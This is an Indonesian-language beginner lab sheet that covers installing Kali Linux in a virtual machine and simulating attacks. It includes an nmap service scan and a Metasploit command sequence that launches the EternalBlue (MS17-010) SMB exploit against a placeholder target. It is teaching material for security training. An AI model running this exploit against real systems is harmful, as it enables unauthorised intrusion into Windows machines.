# **Hands-On:**

#### 1. **Instalasi Kali Linux di VirtualBox/VMware**
   - **Langkah-langkah**:
     1. Unduh ISO Kali Linux dari situs resmi.
     2. Buat mesin virtual baru di VirtualBox/VMware.
     3. Mount ISO Kali Linux ke mesin virtual.
     4. Ikuti proses instalasi hingga selesai.
     5. Konfigurasi jaringan dan update sistem.

#### 2. **Simulasi Dasar Serangan Menggunakan Terminal Kali Linux**
   - **Contoh Simulasi**:
     - **Nmap Scanning**: Gunakan perintah `nmap` untuk memindai port pada target.
       ```bash
       nmap -sV <target_IP>
       ```
     - **Metasploit Framework**: Gunakan Metasploit untuk eksploitasi kerentanan.
       ```bash
       msfconsole
       use exploit/windows/smb/ms17_010_eternalblue
       set RHOSTS <target_IP>
       exploit
       ```
